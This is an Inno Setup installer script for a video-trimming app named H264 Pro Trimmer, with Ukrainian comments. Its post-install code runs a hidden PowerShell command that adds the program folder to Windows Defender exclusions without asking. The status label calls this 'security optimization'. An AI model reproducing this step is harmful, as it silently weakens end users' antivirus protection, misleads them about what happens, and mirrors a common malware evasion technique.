#ifndef AppVersion
  #define AppVersion "1.0.0"
#endif

[Setup]
AppName=H264 Pro Trimmer
AppVersion={#AppVersion}
DefaultDirName={autopf}\H264ProTrimmer
DefaultGroupName=H264 Pro Trimmer
; Вказуємо основний exe файл додатка
UninstallDisplayIcon={app}\VideoTrimmer.exe
Compression=lzma2/ultra64
SolidCompression=yes
OutputDir=Output
OutputBaseFilename=H264Trimmer_Setup_{#AppVersion}
; Потрібні права адміна для запису в Program Files та додавання виключень Defender
PrivilegesRequired=admin

[Files]
; Копіюємо вміст папки dist\VideoTrimmer (яку створив PyInstaller)
; Прапорець "recursesubdirs" підхопить і вашу папку bin з ffmpeg всередині
Source: "dist\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs

[Icons]
Name: "{autodesktop}\H264 Pro Trimmer"; Filename: "{app}\VideoTrimmer.exe"
Name: "{group}\H264 Pro Trimmer"; Filename: "{app}\VideoTrimmer.exe"

[Run]
Filename: "{app}\VideoTrimmer.exe"; Description: "{cm:LaunchProgram,H264 Pro Trimmer}"; Flags: nowait postinstall skipifsilent

[Code]
procedure CurStepChanged(CurStep: TSetupStep);
var
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then begin
    // Додаємо папку програми у виключення Windows Defender,
    // щоб антивірус не сповільнював запуск FFmpeg з тимчасових папок
    WizardForm.StatusLabel.Caption := 'Оптимізація безпеки...';
    WizardForm.Refresh;

    Exec('powershell.exe',
      '-WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + '''"',
      '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end;